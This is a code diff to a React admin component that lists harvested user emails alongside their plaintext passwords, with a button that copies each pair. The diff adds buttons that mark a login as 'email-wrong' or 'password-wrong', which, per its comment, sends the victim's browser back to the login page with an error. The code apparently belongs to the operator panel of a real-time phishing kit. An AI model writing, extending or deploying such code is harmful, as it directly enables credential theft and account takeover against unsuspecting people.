@@ -1,5 +1,6 @@
 "use client";
-import React from "react";
+import React, { useState } from "react";
+import axios from "axios";
 import toast from "react-hot-toast";
 
 interface User {
@@ -9,6 +10,7 @@ interface User {
   createdAt: string | Date;
   deviceType?: string;
   updatedAt?: string;
+  status?: string;
 }
 
 interface UsersProps {
@@ -16,11 +18,40 @@ interface UsersProps {
 }
 
 const Users: React.FC<UsersProps> = ({ users }) => {
+  const [pendingId, setPendingId] = useState("");
+
   const copyToClipboard = (text: string) => {
     navigator.clipboard
       .writeText(text)
       .then(() => toast.success("Copied to clipboard!"))
       .catch((error) => console.error("Failed to copy: ", error));
+  };
+
+  // ❌ Tells the user's browser to go back to /?error=email-wrong or
+  // /?error=password-wrong
+  const markCredentialWrong = async (
+    id: string,
+    status: "email-wrong" | "password-wrong"
+  ) => {
+    setPendingId(id);
+    const loading = toast.loading("Sending...");
+
+    try {
+      await axios.post("/api/admin/user-status", { id, status });
+      toast.success(
+        status === "email-wrong"
+          ? "Email marked as wrong"
+          : "Password marked as wrong",
+        { id: loading }
+      );
+    } catch (error) {
+      const err = error as { response?: { data?: { message?: string } } };
+      toast.error(err?.response?.data?.message || "Something went wrong..!", {
+        id: loading,
+      });
+    } finally {
+      setPendingId("");
+    }
   };
 
   return (
@@ -33,6 +64,7 @@ const Users: React.FC<UsersProps> = ({ users }) => {
               <th className="px-4 py-3">Email</th>
               <th className="px-4 py-3">Password</th>
               <th className="px-4 py-3">Time</th>
+              <th className="px-4 py-3">Status</th>
               <th className="px-4 py-3">Action</th>
             </tr>
           </thead>
@@ -48,15 +80,52 @@ const Users: React.FC<UsersProps> = ({ users }) => {
                 <td className="px-4 py-3 whitespace-nowrap">
                   {new Date(user.createdAt).toLocaleString()}
                 </td>
+                <td className="px-4 py-3 whitespace-nowrap">
+                  {user.status === "email-wrong" && (
+                    <span className="inline-flex items-center px-2 py-0.5 rounded-full text-xs font-medium bg-amber-100 text-amber-800 dark:bg-amber-900/50 dark:text-amber-300">
+                      Email Wrong
+                    </span>
+                  )}
+                  {user.status === "password-wrong" && (
+                    <span className="inline-flex items-center px-2 py-0.5 rounded-full text-xs font-medium bg-red-100 text-red-800 dark:bg-red-900/50 dark:text-red-300">
+                      Password Wrong
+                    </span>
+                  )}
+                  {!user.status && (
+                    <span className="text-xs text-gray-400 dark:text-gray-500">
+                      —
+                    </span>
+                  )}
+                </td>
                 <td className="px-4 py-3">
-                  <button
-                    onClick={() =>
-                      copyToClipboard(`${user.email}   ${user.password}`)
-                    }
-                    className="bg-blue-500 hover:bg-blue-600 text-white text-xs px-3 py-1 rounded-lg transition-colors"
-                  >
-                    Copy
-                  </button>
+                  <div className="flex flex-wrap items-center gap-2">
+                    <button
+                      onClick={() =>
+                        copyToClipboard(`${user.email}   ${user.password}`)
+                      }
+                      className="bg-blue-500 hover:bg-blue-600 text-white text-xs px-3 py-1 rounded-lg transition-colors"
+                    >
+                      Copy
+                    </button>
+                    <button
+                      onClick={() =>
+                        markCredentialWrong(user._id, "email-wrong")
+                      }
+                      disabled={pendingId === user._id}
+                      className="bg-amber-500 hover:bg-amber-600 disabled:opacity-50 disabled:cursor-not-allowed text-white text-xs px-3 py-1 rounded-lg transition-colors"
+                    >
+                      Wrong Email
+                    </button>
+                    <button
+                      onClick={() =>
+                        markCredentialWrong(user._id, "password-wrong")
+                      }
+                      disabled={pendingId === user._id}
+                      className="bg-red-500 hover:bg-red-600 disabled:opacity-50 disabled:cursor-not-allowed text-white text-xs px-3 py-1 rounded-lg transition-colors"
+                    >
+                      Wrong Password
+                    </button>
+                  </div>
                 </td>
               </tr>
             ))}
